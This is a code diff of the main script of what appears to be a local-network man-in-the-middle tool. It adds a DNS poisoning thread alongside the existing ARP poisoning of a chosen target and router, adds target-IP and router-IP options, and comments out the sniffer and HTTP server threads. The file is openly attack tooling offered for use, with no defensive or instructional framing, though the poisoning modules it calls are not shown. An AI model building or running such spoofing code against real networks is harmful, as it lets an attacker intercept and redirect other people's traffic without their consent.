@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import argparse
 import os
 import sys
@@ -8,6 +9,7 @@ from queue import Queue
 from arp_poisoning import start_arp_poisoning
 from http_server import start_http_server_thread
 from packet_analysis import start_sniffer_thread
+from dns_poisoning import start_dns_poisoning
 
 from colorama import init, Fore
 
@@ -30,16 +32,22 @@ def printer(queue):
             print(message)
 
 
-def initialize_program(interface_pc, mac_address, ip_address, verbosity, local_printing_queue):
-    type(ip_address)
+def initialize_program(interface_pc, mac_address, ip_address, router_ip, verbosity, local_printing_queue):
 
     original_tokens_list = []
 
-    router_ip = get_router_ip()
+    if router_ip is None:
+        router_ip = get_router_ip()
+
+
     run_configuration_commands(router_ip)
 
     # getting targeted device
-    targeted_device = get_target_to_attack(mac_address, ip_address)
+    if ip_address is not None:
+        targeted_ip = ip_address
+    else:
+        targeted_device = get_target_to_attack(mac_address, ip_address)
+        targeted_ip = targeted_device['ip']
 
     
     # starting thread for printing everything
@@ -48,16 +56,22 @@ def initialize_program(interface_pc, mac_address, ip_address, verbosity, local_p
     original_printer_thread.start()
 
     # starting core threads
-    sniffer_thread_token = start_sniffer_thread(interface_pc, targeted_device['ip'], router_ip, local_printing_queue,
-                                                verbosity)
 
-    http_server_thread = start_http_server_thread(local_printing_queue, verbosity)
-    arp_poisoning_token = start_arp_poisoning(interface_pc ,targeted_device, router_ip, local_printing_queue, verbosity)
+    arp_poisoning_token = start_arp_poisoning(interface_pc, targeted_ip, router_ip, local_printing_queue, verbosity)
 
+
+    # sniffer_thread_token = start_sniffer_thread(interface_pc, targeted_ip, router_ip, local_printing_queue,verbosity)
+
+    dns_poisoning_token = start_dns_poisoning(interface_pc,targeted_ip, router_ip, local_printing_queue, verbosity)
+
+
+    # http_server_thread = start_http_server_thread(interface_pc,local_printing_queue, verbosity)
     # creating list with cancellation tokens
-    original_tokens_list.append(sniffer_thread_token)
+    # original_tokens_list.append(sniffer_thread_token)
     # original_thread_list.append(http_server_thread)
     original_tokens_list.append(arp_poisoning_token)
+
+    original_tokens_list.append(dns_poisoning_token)
 
     return original_tokens_list, original_printer_thread
 
@@ -66,7 +80,8 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument('-i', '--interface', default="wlan0")
     parser.add_argument('-m', '--mac_address')
-    parser.add_argument('-a', "--address")
+    parser.add_argument('-t', "--target_ip")
+    parser.add_argument('-r', '--router_ip')
     parser.add_argument('-v', '--verbosity', default=0)
     # parser.add_argument('-n', '--no-http')
     args = parser.parse_args()
@@ -77,7 +92,7 @@ if __name__ == "__main__":
 
     printing_queue = Queue()
 
-    tokens_list, printer_thread = initialize_program(args.interface, args.mac_address, args.address, args.verbosity,
+    tokens_list, printer_thread = initialize_program(args.interface, args.mac_address, args.target_ip, args.router_ip , args.verbosity,
                                                      printing_queue)
     time.sleep(1)
     while True:
